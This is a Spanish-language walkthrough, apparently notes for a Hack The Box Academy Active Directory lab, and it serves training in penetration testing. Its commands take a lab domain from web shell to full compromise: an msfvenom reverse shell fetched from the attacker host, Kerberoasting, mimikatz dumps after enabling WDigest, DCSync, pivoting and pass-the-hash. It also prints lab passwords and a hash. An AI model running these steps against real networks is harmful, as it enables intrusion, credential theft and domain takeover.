## Escenario

Un miembro del equipo comenzó una Prueba de Penetración Externa y fue trasladado a otro proyecto urgente antes de poder terminar. El miembro del equipo logró encontrar y explotar una vulnerabilidad de subida de archivos después de realizar reconocimiento del servidor web expuesto externamente. Antes de cambiar de proyecto, nuestro compañero dejó una web shell protegida por contraseña (con las credenciales: `admin:My_W3bsH3ll_P@ssw0rd!`) en su lugar para que nosotros comencemos en el directorio `/uploads`. Como parte de esta evaluación, nuestro cliente, Inlanefreight, nos ha autorizado a ver hasta dónde podemos llevar nuestro punto de apoyo y está interesado en ver qué tipos de problemas de alto riesgo existen dentro del entorno AD. Aprovecha la web shell para obtener un punto de apoyo inicial en la red interna. Enumera el entorno de Active Directory buscando fallas y configuraciones incorrectas para moverte lateralmente y finalmente lograr el compromiso del dominio.

Aplica lo aprendido en este módulo para comprometer el dominio y responde las preguntas a continuación para completar la parte I de la evaluación de habilidades.

##### 1. _Sube los contenidos del archivo flag.txt en el Escritorio del administrador del servidor web_

Nos tomaremos este laboratorio como si de una máquina se tratara. Por ello, comenzamos con la enumeración de puertos:

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.202.242
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 01:24 CET
Nmap scan report for 10.129.202.242
Host is up (0.11s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
..SNIP...
```

El puerto 80 se encuentra abierto, por lo que navegamos mediante `http` a `http://10.129.202.242/uploads/antak.aspx`, que es donde ya se encuentra la shell. Iniciamos sesión con las credenciales provistas. Simplemente ejecutamos el comando de lectura de la flag:

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

>**Respuesta**: JusT_g3tt1ng_st@rt3d!
##### 2. _Realiza Kerberoast a una cuenta con el SPN MSSQLSvc/SQL01.inlanefreight.local:1433 y envía el nombre de la cuenta como respuesta_

Esta shell supone un absoluto tostón. Cambiemos a una reverse shell. Lo primero es identificar el tipo de sistema de la máquina víctima. Con el comando `systeminfo` lo podemos saber:

![[Pasted image 20251213013414.png]]

Vale, sabemos que es x64. Por tanto, en este punto, para mayor comodidad, generaremos con `msfvenom` una revershe shell con este tipo de payload:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.165 LPORT=443 -f exe -o revmeter.exe
```

Iniciamos el listener con Metasploit para obtener directamente una sesión con Meterpreter:

```bash
$ msfconsole
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.165
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.165:443 
```

Para poder subir el archivo desde la shell de Antax, tendremos que preparar un servidor local en Python. Por tanto, en nuestra máquina Kali:

```bash
python -m http.server 8000
```

Y en la shell de Antax:

```powershell
curl http://10.10.14.165:8000/revmeter.exe -O C:\Windows\System32\payload.exe
```

Nos avisará el servidor: `10.129.202.242 - - [13/Dec/2025 01:41:43] "GET /revmeter.exe HTTP/1.1" 200 -`. En este punto simplemente ejecutamos el payload y obtendremos la sesión. Ahora que tenemos la sesión válida, obtenemos del dominio INLANEFREIGHT.LOCAL los _Service Principal Names_ (SPNs). 

**¿Qué es un SPN?**

Un **Service Principal Name (SPN)** es un identificador único que asocia una instancia de servicio con una cuenta de AD. Cuando un servicio se ejecuta bajo una cuenta de dominio (user account), necesita un SPN registrado para que los clientes puedan autenticarse usando Kerberos.

**Formato típico**: `servicio/host:puerto`

- Ejemplo: `MSSQLSvc/SQL01.inlanefreight.local:1433`

```powershell
setspn -T INLANEFREIGHT.LOCAL -Q */*
```

**Desglose de parámetros:**
 - `-T INLANEFREIGHT.LOCAL` → Target domain (dominio objetivo) 
 - `-Q */*` → Query all SPNs (buscar todos los SPNs registrados) 
 - `*/*` → Wildcard para servicio/host (cualquier servicio en cualquier host)

![[Pasted image 20251213015416.png | 600]]

>**Respuesta**: svc_sql

##### 3. _Crackea la contraseña de la cuenta. Envía el valor en texto claro._

Vamos a hacer esto de dos formas para aprender. 

Obtenemos Rubeus y PowerView en nuestro Kali: 

```bash
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

Lo subimos desde la sesión de meterpreter:

```bash
meterpreter > upload ~/Escritorio/HTB/Academy/ActiveDirectory/Lab1/Rubeus.exe C:\\Windows\\Temp\\Rubeus.exe
[*] Uploading  : /home/kali/Escritorio/HTB/Academy/ActiveDirectory/Lab1/Rubeus.exe -> C:\Windows\Temp\Rubeus.exe
[*] Uploaded 436.50 KiB of 436.50 KiB (100.0%): /home/kali/Escritorio/HTB/Academy/ActiveDirectory/Lab1/Rubeus.exe -> C:\Windows\Temp\Rubeus.exe
[*] Completed  : /home/kali/Escritorio/HTB/Academy/ActiveDirectory/Lab1/Rubeus.exe -> C:\Windows\Temp\Rubeus.exe
```

> _Hacemos lo mismo para PowerView.ps1_

O desde sesión de windows:

```powershell
shell 
powershell 

# Descargar Rubeus 
(New-Object Net.WebClient).DownloadFile('http://10.10.14.74:8000/Rubeus.exe', 'C:\Windows\Temp\Rubeus.exe') 

# Descargar PowerView 
(New-Object Net.WebClient).DownloadFile('http://10.10.14.74:8000/PowerView.ps1', 'C:\Windows\Temp\PowerView.ps1')
```

Ejecutando Rubeus:

```powershell
cd C:\Windows\Temp
.\Rubeus.exe kerberoast /simple /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 7
...SNIP...
```

**Para hacerlo con PowerView**

```powershell
PS C:\Windows\Temp> Import-Module C:\Windows\Temp\PowerView.ps1

PS C:\Windows\Temp> Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
```

O si sólo queremos el hash del usuario `sql_svc`:

```powershell
PS C:\Windows\Temp> Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat

o

PS C:\Windows\Temp> Invoke-Kerberoast -Identity svc_sql -OutputFormat Hashcat
```

De cualquier forma, una vez tengamos el hash, lo desciframos con hashcat:

```bash
hashcat -m 13100 svc_sql_hash.txt /usr/share/wordlists/rockyou.txt 
```

>**Respuesta**: lucky7

##### 4. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en MS01_

- **MS01** (172.16.6.50) es un servidor miembro del dominio INLANEFREIGHT.LOCAL
- La flag está en `C:\Users\Administrator\Desktop\flag.txt` de MS01
- Necesitas acceder a MS01 usando las credenciales de **svc_sql:lucky7**

```powershell
PS C:\Windows\Temp> net use \\172.16.6.50\C$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
net use \\172.16.6.50\C$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
The command completed successfully.

PS C:\Windows\Temp> net use
net use
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK                     \\172.16.6.50\C$          Microsoft Windows Network
The command completed successfully.

PS C:\Windows\Temp> type \\172.16.6.50\C$\Users\Administrator\Desktop\flag.txt
```

> **Respuesta:** spn$_r0ast1ng_on_@n_0p3n_f1re

##### 5. _Encuentra credenciales en texto claro de otro usuario del dominio. Envía el nombre de usuario como respuesta._

Primero, necesitamos conectarnos a **MS01.INLANEFREIGHT.LOCAL** usando las credenciales que hemos obtenido previamente. Dado que no tenemos acceso directo a esta máquina, tendremos que establecer una regla de redireccionamiento de puertos (_port forwarding_) para habilitar acceso remoto RDP desde nuestra máquina.

```powershell
PS C:\Windows\Temp> netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=10.129.202.242 connectport=3389 connectaddress=172.16.6.50
```

Comprobamos: 

```powershell
PS C:\Windows\Temp> netsh.exe interface portproxy show all
netsh.exe interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.202.242  8888        172.16.6.50     3389
```

E iniciamos la conexión usando RDP (desde nuestro Kali):

```bash
xfreerdp3 /u:svc_sql /p:lucky7 /v:10.129.202.242:8888 /dynamic-resolution /drive:Shared,//home/kali/Escritorio/HTB/Academy/ActiveDirectory/Lab1
```

> Con `/drive:Shared,//home/...` le decimos que monte un share con nuestra propia máquina. 

![[Pasted image 20251219090248.png]]

![[Pasted image 20251219091722.png]]

Tenemos acceso a nuestras herramientas gracias al share. Tenemos que meter ahí mimikatz para el próximo paso. Ahora abrimos powershell como administrador en la máquina víctima a la que hemos accedido de forma remota y lanzamos mimikatz:

```powershell
PS C:\Users\svc_sql.INLANEFREIGHT> cd \\tsclient\Shared
PS Microsoft.PowerShell.Core\FileSystem::\\tsclienbt\Shared> cd x64
PS Microsoft.PowerShell.Core\FileSystem::\\tsclienbt\Shared\x64> .\mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

![[Pasted image 20251219103038.png]]

El usuario `tpetty` muestra que en wdigest no hay contraseña. 

>**Respuesta**: tpetty

##### 6. _Envía la contraseña en texto claro de este usuario._

En este punto vamos a avanzar a través de **WDigest**, puesto que hemos visto que para el usuario previo la contraseña era null. **WDigest** es un proveedor de autenticación de Windows que almacena credenciales en memoria para autenticación HTTP. Históricamente almacenaba contraseñas en **texto claro reversible** en el proceso LSASS.

Tiramos del siguiente comando:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

- `reg add` → Agregar/modificar una clave de registro 
- `HKLM\...\WDigest` → Ruta de configuración del proveedor WDigest 
- `/v UseLogonCredential` → Nombre del valor (variable) 
- `/t REG_DWORD` → Tipo de dato (entero de 32 bits)
- `/d 1` → Valor = **1 (habilitado)** / 0 (deshabilitado)

Con el valor 1 habilitado, Windows almacenará contraseñas en texto claro en memoria LSASS. Las credenciales estarán disponibles para WDigest en logons futuros. 
Para valor 0, Windows NO almacena contraseñas en wdigest, y por eso vimos `Password : (null)` para tpetty en Mimikatz. 

1. **tpetty inició sesión ANTES** de que habilitaras WDigest 
2. Windows (versión moderna) tiene WDigest deshabilitado por defecto 
3. Su contraseña nunca se almacenó en memoria en formato wdigest

Reiniciamos el equipo remoto:

```powershell
shutdown.exe /r /t 0 /f
```

Y volvemos a iniciar sesión. Repetimos el mismo proceso que antes con mimikatz...

![[Pasted image 20251219105520.png]]

>**Respuesta**: Sup3rS3cur3D0m@inU2eR

##### 7. _¿Qué ataque puede realizar este usuario?_

Para resolver esto, vamos a enumerar los ACLs de este usuario, y así podremos ver sus permisos y capacidades. Antes de poder importar PowerView, tenemos que hacer un bypass temporal en la sesión actual.

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

Y ahora sí, importamos el módulo.

```powershell
Import-Module .\PowerView.ps1
```

Una vez importado enumeramos ACLs del usuario: 

```powershell
$sid = Convert-NameToSid tpetty
Get-DomainObjectACL -Identity "DC=INLANEFREIGHT,DC=LOCAL" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```

Este comando busca **ataques basados en ACLs abusables**, como:

- **GenericAll** → Control total sobre un objeto
- **WriteDacl** → Modificar permisos de un objeto
- **GenericWrite** → Modificar propiedades de un objeto
- **WriteOwner** → Tomar ownership de un objeto
- **ForceChangePassword** → Cambiar contraseña de otro usuario sin conocerla
- **AddMember** → Agregar miembros a un grupo

![[Pasted image 20251219110424.png]]

> **Respuesta:** DCSync

- **tpetty tiene ExtendedRight** sobre el dominio raíz
- Los **ObjectAceType específicos** corresponden a permisos de replicación
- Estos permisos normalmente solo los tienen los **Domain Controllers**
- Al tenerlos, tpetty puede **actuar como un DC** y solicitar replicación de datos

Vamos a refrescar un poco la memoria. 

**ACL (Access Control List)**: Lista que define **quién puede hacer qué** sobre un objeto de AD.
**ExtendedRight**: Tipo de permiso especial en AD que permite operaciones avanzadas más allá de lectura/escritura básica.

**_*¿Qué significan estos permisos?*_**

**DS-Replication-Get-Changes**: "Puedo pedir cambios del directorio" **DS-Replication-Get-Changes-All**: "Puedo pedir TODOS los cambios, incluyendo secretos"

**_Por qué esto es DCSync_**

Los **Domain Controllers** usan estos permisos para **replicarse entre ellos** y mantenerse sincronizados. La replicación incluye hashes de contraseñas.
**tpetty tiene los mismos permisos** → Puede **fingir ser un DC** → Solicitar replicación → **Extraer hashes NTLM de cualquier usuario** (incluido Administrator y krbtgt).

Es como tener una credencial que dice "Soy un banco central, dame copias de todos los registros financieros". El sistema confía y entrega toda la información sensible sin cuestionarlo.

> **tpetty + ExtendedRight (replicación) sobre el dominio = DCSync = Extraer todos los hashes = Compromiso total del dominio**

##### 8. _Toma el control del dominio y envía el contenido del archivo flag.txt en el escritorio del Administrator en DC01_

Lo primero es ejecutar powershell desde el usuario `tpetty`

```powershell
runas /user:INLANEFREIGHT\tpetty powershell.exe
```

Nos pedirá contraseña, que es la que hemos obtenido previamente: Sup3rS3cur3D0m@inU2eR. Abre un cmd como este usuario. Procedemos a movernos a nuestro share y abrimos mimikatz.

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

![[Pasted image 20251219113549.png]]

Ya tenemos el hash NTLM del administrador, con el que podremos acontecer un Pass the Hash. Pero antes de ello, tenemos que verificar qué puertos se encuentran abiertos para el DC. Por ello, averiguamos su IP con `nslookup`:

![[Pasted image 20251219114003.png]]

En este punto, volviendo a nuestra sesión con meterpreter, ponemos en segundo plano la sesión con `Ctrl+Z`

![[Pasted image 20251219114527.png | 600]]

De esta forma, agregamos una ruta para que todo el tráfico hacia **172.16.6.0/24** pase a través de la sesión Meterpreter, usando WEB-WIN01 (el target original de HTB) como pivote. El flujo es el siguiente:

Kali → VPN (10.10.14.74) → WEB-WIN01 (10.129.177.67) → Subred interna (172.16.6.0/24) → DC01 (172.16.6.3)

Volvemos a dejar en segundo plano la sesión con meterpreter y seguimos el siguiente flujo para el escaneo de puertos:

```bash
meterpreter > background
[*] Backgrounding session 3...
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.6.3
RHOSTS => 172.16.6.3
msf6 auxiliary(scanner/portscan/tcp) > exploit
```

Esperamos y, tras un tiempo, obtenemos los puertos abiertos. Descubrimos que el puerto de WinRM, `5985` se encuentra abierto. Para poder acontecer el PtH tendremos que hacer port forwarding. Volvemos a la sesión de Meterpreter:

```bash
msf6 auxiliary(scanner/portscan/tcp) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WEB-WIN01  10.10.14.74:443 -> 10.129.177.67:55594 (10.129.177.67)

msf6 auxiliary(scanner/portscan/tcp) > sessions -i 3
[*] Starting interaction with 3...
```

Hacemos la regla:

```
meterpreter > portfwd add -l 6666 -p 5985 -r 172.16.6.3
[*] Forward TCP relay created: (local) :6666 -> (remote) 172.16.6.3:5985
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local         Remote           Direction
   -----  -----         ------           ---------
   1      0.0.0.0:6666  172.16.6.3:5985  Forward

1 total active port forwards.
```

Y lanzamos evil-winrm

```bash
evil-winrm -i 10.10.14.74 --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0 
```

Obtendremos la flag en el escritorio del administrador.

![[Pasted image 20251219120905.png]]

>**Respuesta**: r3plicat1on_m@st3r!

## Resumen del ataque completo

### 1. **Punto de entrada inicial**

- Web shell en `/uploads` → Reverse shell con Meterpreter

### 2. **Kerberoasting**

- Enumeración de SPNs: `setspn -T INLANEFREIGHT.LOCAL -Q */*`
- Usuario encontrado: **svc_sql** con SPN
- Extracción de hash TGS con **Rubeus** y **PowerView**
- Crackeo con hashcat: `svc_sql:lucky7`

### 3. **Movimiento lateral a MS01**

- Acceso con credenciales de svc_sql
- Port forwarding con `netsh` para RDP
- Ejecución de Mimikatz para dump de memoria

### 4. **Enumeración de permisos ACL**

- Usuario encontrado: **tpetty**
- Permisos: **ExtendedRight** (DS-Replication-Get-Changes)
- Ataque identificado: **DCSync**

### 5. **DCSync Attack**

- Extracción de hash NTLM del Administrator: `27dedb1dab4d8545c6e1c66fba077da0`
- Mimikatz: `lsadump::dcsync /user:administrator`

### 6. **Compromiso del dominio**

- Pivoting con **autoroute** de Meterpreter a subred 172.16.6.0/24
- Port forwarding WinRM: puerto 6666 → 172.16.6.3:5985
- **Pass-the-Hash** con evil-winrm → Acceso como Domain Admin
- Flag final: `r3pl1cation_m@st3r!`

## Técnicas usadas

✅ Kerberoasting (Rubeus, PowerView, Invoke-Kerberoast) 
✅ Mimikatz (sekurlsa::logonpasswords, lsadump::dcsync) 
✅ Enumeración de ACLs (Get-DomainObjectACL) 
✅ DCSync Attack 
✅ Pivoting con Meterpreter (autoroute, portfwd) 
✅ Pass-the-Hash (evil-winrm, impacket)